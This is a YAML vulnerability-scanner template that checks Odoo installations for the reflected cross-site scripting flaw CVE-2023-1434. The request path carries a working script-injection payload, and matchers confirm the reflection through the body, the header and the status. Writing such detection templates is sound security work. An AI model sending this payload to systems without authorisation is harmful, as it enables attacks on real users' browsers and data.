id: "odoo-xss"
name: "Odoo - Cross-Site Scripting"
severity: "medium"
description: "Odoo is a business suite that has features for many business-critical areas, such as e-commerce, billing, or CRM. Versions before the 16.0 release are vulnerable to CVE-2023-1434 and is caused by an incorrect content type being set on an API endpoint."
tech:
  - "generic"
tags:
  - "odoo"
  - "xss"
  - "vkev"
  - "vuln"
cwe: "CWE-79"
reference: "https://www.sonarsource.com/blog/odoo-get-your-content-type-right-or-else"
spaExclusion: true
request:
  method: "GET"
  path: "/web/set_profiling?profile=0&collectors=<script>alert(document.domain)</script>"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "word"
    part: "body"
    words:
      - "<script>alert(document.domain)</script>"
      - "\"params\":"
      - "session"
    condition: "and"
  - type: "word"
    part: "header"
    words:
      - "text/html"
  - type: "status"
    status:
      - 200
